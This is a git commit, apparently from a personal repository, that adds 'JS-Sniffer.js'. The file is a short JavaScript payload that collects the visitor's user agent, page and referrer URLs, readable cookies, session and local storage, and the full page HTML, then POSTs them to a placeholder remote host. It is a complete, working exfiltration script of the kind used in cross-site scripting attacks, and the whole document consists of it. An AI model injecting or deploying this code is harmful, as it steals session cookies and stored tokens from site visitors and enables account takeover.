2e86ed66caba1bd181e22fa43ce0c0f05a5dca6d
WebDiamond <webdiamond7@gmail.com>
2019-09-15 22:06:42 +0200

    Create JS-Sniffer.js

---
+++ JS-Sniffer.js
@@ -0,0 +1,11 @@
+var mailer = '//host/x/';
+
+var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
+msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
+msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage);
+msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
+
+var r = new XMLHttpRequest();
+r.open('POST', mailer, true);
+r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
